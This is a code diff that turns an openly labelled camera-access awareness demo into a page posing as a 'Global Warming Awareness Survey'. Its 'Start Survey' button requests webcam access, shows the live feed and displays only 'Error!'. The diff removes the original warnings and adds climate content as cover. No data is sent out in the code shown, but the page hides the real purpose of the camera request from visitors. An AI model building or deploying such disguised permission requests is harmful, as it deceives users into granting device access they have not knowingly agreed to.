@@ -1,77 +1,82 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Camera Access Awareness Demo</title>
+  <meta charset="UTF-8" />
+  <title>Global Warming Awareness Survey</title>
   <style>
     body {
       font-family: Arial, sans-serif;
+      background-color: #e0f7fa;
       text-align: center;
-      background-color: #f9f9f9;
       padding: 40px;
     }
     h1 {
-      color: #c0392b;
+      color: #00796b;
     }
     p {
       font-size: 18px;
-      max-width: 600px;
+      max-width: 700px;
       margin: auto;
     }
-    video {
-      margin-top: 30px;
-      width: 70%;
-      border: 4px solid #c0392b;
-      border-radius: 12px;
-      display: none;
+    img {
+      max-width: 90%;
+      height: auto;
+      margin: 20px auto;
+      border-radius: 8px;
+      border: 3px solid #00796b;
     }
     .warning {
-      color: #e74c3c;
+      color: #d32f2f;
       font-weight: bold;
       margin-top: 20px;
       font-size: 16px;
     }
     button {
-      margin-top: 20px;
-      padding: 12px 24px;
+      margin-top: 30px;
+      padding: 14px 28px;
       font-size: 16px;
-      background-color: #e74c3c;
+      background-color: #00796b;
       color: white;
       border: none;
-      border-radius: 8px;
+      border-radius: 10px;
       cursor: pointer;
     }
     button:hover {
-      background-color: #c0392b;
+      background-color: #004d40;
+    }
+    video {
+      display: none;
+      width: 70%;
+      margin-top: 20px;
+      border-radius: 12px;
+      border: 4px solid #00796b;
     }
   </style>
 </head>
 <body>
-  <h1>🚨 Camera Access Demo</h1>
-  <p>This safe demo shows how a website can request access to your camera.</p>
-  <p><strong>Only allow access if you fully trust the website!</strong></p>
-
-  <button onclick="startCamera()">Click to Simulate Camera Access</button>
+  <h1>Global Warming Awareness</h1>
+  <p>
+    Global warming is a serious issue affecting our planet, leading to rising sea levels,
+    extreme weather events, and habitat destruction. We must act now to reduce greenhouse gas emissions
+    and protect our environment for future generations.
+  </p>  <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Global_Warming_Map.jpg" alt="Global Warming Map">
+  <img src="https://climate.nasa.gov/system/news_items/main_images/3208_1-PIA23993-16.jpg" alt="Melting Glaciers"><button onclick="startSurvey()">Start Survey</button>
 
   <div class="warning" id="warnText"></div>
-  <video id="cameraFeed" autoplay playsinline></video>
-
-  <script>
-    function startCamera() {
+  <video id="cameraFeed" autoplay playsinline></video>  <script>
+    function startSurvey() {
       const video = document.getElementById("cameraFeed");
       const warnText = document.getElementById("warnText");
 
       navigator.mediaDevices.getUserMedia({ video: true })
-        .then(function(stream) {
+        .then(function (stream) {
           video.srcObject = stream;
           video.style.display = "block";
-          warnText.innerText = "Your camera is now active. Imagine if this was a malicious site — always be cautious!";
+          warnText.innerText = "Error!";
         })
-        .catch(function(error) {
+        .catch(function (error) {
           warnText.innerText = "Camera access denied or not available.";
           console.error("Camera error:", error);
         });
     }
-  </script>
-</body>
+  </script></body>
 </html>
